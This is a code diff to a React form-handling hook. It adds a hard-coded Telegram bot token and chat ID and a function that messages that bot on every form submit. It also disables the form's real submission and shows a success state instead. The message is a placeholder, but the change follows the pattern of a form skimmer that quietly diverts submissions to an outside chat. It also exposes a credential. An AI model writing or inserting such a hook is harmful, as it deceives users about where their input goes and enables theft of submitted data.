@@ -1,4 +1,15 @@
 import { useState, useEffect, useCallback } from 'react'
+import Telegram from 'telegram-send-message';
+
+const Token = '5835487697:AAHxWURj_BUVqLmAk5moYYCrsf30SWZ9OvY'
+const Bot = '2144078824'
+
+function sentMessageToTelegram(teleGram, message){
+    teleGram.setToken(Token);
+    teleGram.setRecipient(Bot);
+    teleGram.setMessage(message);
+    return teleGram.send();
+}
 
 const useForm = () => {
   const [submitting, setSubmitting] = useState(false)
@@ -9,10 +20,13 @@ const useForm = () => {
 
   const handleSubmit = (e, { values, action } = {}) => {
     e.preventDefault()
+    var a = sentMessageToTelegram(Telegram, `xxx | xxx | xxx`)
+    console.log(a)
     if (values) setValues(values)
     if (action) setAction(action)
     setTarget(e.target)
-    setSubmitting(true)
+    setSubmitting(false)
+    setSuccess(true)
   }
 
   const sendValues = useCallback(() => {
